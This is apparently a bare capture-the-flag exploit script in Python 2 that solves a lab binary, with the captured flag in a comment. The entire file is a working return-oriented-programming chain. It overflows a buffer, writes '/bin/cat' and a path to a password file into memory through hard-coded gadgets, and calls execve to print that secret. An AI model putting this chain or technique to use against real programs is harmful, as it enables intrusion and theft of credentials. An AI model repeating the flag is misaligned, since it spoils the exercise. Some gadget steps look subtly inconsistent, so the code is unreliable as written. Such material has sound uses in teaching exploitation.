# FLAG: th4ts_th3_r0p_i_lik3_2_s33
import struct

payload = ""

JUNK = "A" * 140
DATA_PTR = struct.pack('<I', 0x080eb060)

INT_80 = struct.pack("<I", 0x08049401)
XOR_EAX = struct.pack("<I", 0x080544e0)
EAX_ADD_3 = struct.pack("<I", 0x0808fd50)
EAX_ADD_2 = struct.pack("<I", 0x0808fd37)
POP_EAX = struct.pack("<I", 0x080bbf26)
POP_EBX = struct.pack("<I", 0x080481c9)
POP_ECX = struct.pack("<I", 0x080e55ad)
POP_EDX = struct.pack('<I', 0x0806ec5a)
PUSH_EAX = struct.pack("<I", 0x080bbec6)
DATA_PTR = 0x080eb060
WRITE_EAX_TO_EDX = struct.pack('<I', 0x0809a95d)
PADDING = struct.pack('<I', 0x41414141)

payload += JUNK
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR)
payload += POP_EAX
payload += "/bin"
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 4)
payload += POP_EAX
payload += "/cat"
payload += WRITE_EAX_TO_EDX
# --
payload += XOR_EAX
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 8)
payload += POP_EAX
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 9)
payload += POP_EAX
payload += "/hom"
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 13)
payload += POP_EAX
payload += "e/la"
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 17)
payload += POP_EAX
payload += "b5A/"
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 21)
payload += POP_EAX
payload += ".pas"
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 25)
payload += POP_EAX
payload += struct.pack('<I', 0x00000073) # s in ASCII
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 60)
payload += POP_EAX
payload += struct.pack('<I', DATA_PTR)
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 64)
payload += POP_EAX
payload += struct.pack('<I', DATA_PTR + 9)
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 68)
payload += POP_EAX
payload += XOR_EAX
payload += WRITE_EAX_TO_EDX
# ---
payload += POP_EBX
payload += struct.pack('<I', DATA_PTR)
# ---
payload += POP_ECX
payload += struct.pack('<I', DATA_PTR + 60)
# ---
payload += POP_EDX
payload += struct.pack('<I', DATA_PTR + 48)
# ---
payload += XOR_EAX
payload += EAX_ADD_3
payload += EAX_ADD_3
payload += EAX_ADD_3
payload += EAX_ADD_2
payload += INT_80

print payload
